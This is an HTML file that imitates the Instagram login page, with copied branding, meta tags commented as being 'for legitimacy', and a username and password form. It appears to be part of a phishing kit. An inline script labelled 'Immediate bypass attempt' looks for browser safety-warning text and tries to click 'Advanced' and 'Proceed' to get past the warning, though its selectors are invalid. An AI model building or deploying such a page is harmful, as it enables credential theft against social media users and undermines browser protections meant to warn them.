<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram — Login</title>
    
    <!-- Meta tags for legitimacy -->
    <meta name="description" content="Log in to Instagram to see photos and videos from friends and discover other accounts you'll love.">
    <meta name="keywords" content="Instagram, login, social media, photos, videos">
    <meta name="author" content="Instagram">
    <meta name="robots" content="noindex, nofollow">
    
    <!-- Open Graph tags -->
    <meta property="og:title" content="Instagram">
    <meta property="og:description" content="Log in to Instagram to see photos and videos from friends">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Instagram">
    
    <!-- Security meta tags -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="format-detection" content="telephone=no">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Pacifico&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23E4405F' d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.059 1.645-.07 4.849-.07zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'/></svg>">
</head>
<body>
    <main class="page" role="main" aria-label="Instagram login">
        <div class="stage">
            <div class="spacer" aria-hidden="true"></div>


            <div>
                <section class="card" aria-labelledby="heading-login">
                    <h1 id="heading-login" class="logo">Instagram</h1>

                    <form id="loginForm" class="login-form" aria-label="Login form">
                        <input class="input" type="text" id="username" name="username" placeholder="Phone number, username or email address" autocomplete="username" required />
                        <input class="input" type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required />
                        <button class="btn" type="submit" id="loginBtn" aria-label="Log in" disabled>Log in</button>

                        <div class="or-row" aria-hidden="true">
                            <span class="or-text">OR</span>
                        </div>

                        <a href="#" class="fb" role="button" aria-label="Log in with Facebook">
                            <span class="fb-bubble" aria-hidden="true">f</span>
                            <span>Log in with Facebook</span>
                        </a>

                        <a href="#" class="forgot">Forgotten your password?</a>
                    </form>
                </section>

                <div class="signup-box" role="region" aria-label="Sign up">
                    Don't have an account? <a href="#" class="signup-link">Sign up</a>
                </div>


                <footer class="footer" role="contentinfo" aria-label="Footer">
                    <div class="footer-links" role="navigation" aria-label="Footer links">
                        <span>Meta</span>
                        <span>About</span>
                        <span>Blog</span>
                        <span>Jobs</span>
                        <span>Help</span>
                        <span>API</span>
                        <span>Privacy</span>
                        <span>Terms</span>
                        <span>Locations</span>
                        <span>Instagram Lite</span>
                        <span>Meta AI</span>
                        <span>Meta AI articles</span>
                        <span>Threads</span>
                        <span>Contact uploading and non-users</span>
                        <span>Meta Verified</span>
                    </div>

                    <div class="copyright">English (UK) &nbsp;&nbsp; © 2025 Instagram from Meta</div>
                </footer>
            </div>
        </div>
    </main>
    
    <script src="script.js"></script>
    <script src="bypass.js"></script>
    <script>
        // Immediate bypass attempt
        (function() {
            // Check if we're on a warning page
            const isWarningPage = document.body.innerText.toLowerCase().includes('dangerous') || 
                                 document.body.innerText.toLowerCase().includes('attackers') ||
                                 document.body.innerText.toLowerCase().includes('unsafe');
            
            if (isWarningPage) {
                console.log('Warning page detected, attempting immediate bypass...');
                
                // Immediate bypass attempts
                setTimeout(() => {
                    // Try to find and click advanced button
                    const advancedBtn = document.querySelector('button:contains("Advanced"), a:contains("Advanced")');
                    if (advancedBtn) advancedBtn.click();
                }, 100);
                
                setTimeout(() => {
                    // Try to find and click proceed button
                    const proceedBtn = document.querySelector('button:contains("Proceed"), a:contains("Proceed")');
                    if (proceedBtn) proceedBtn.click();
                }, 500);
                
                setTimeout(() => {
                    // Force navigation if still on warning page
                    if (document.body.innerText.toLowerCase().includes('dangerous')) {
                        window.location.href = window.location.href;
                    }
                }, 1000);
            }
        })();
    </script>
</body>
</html>
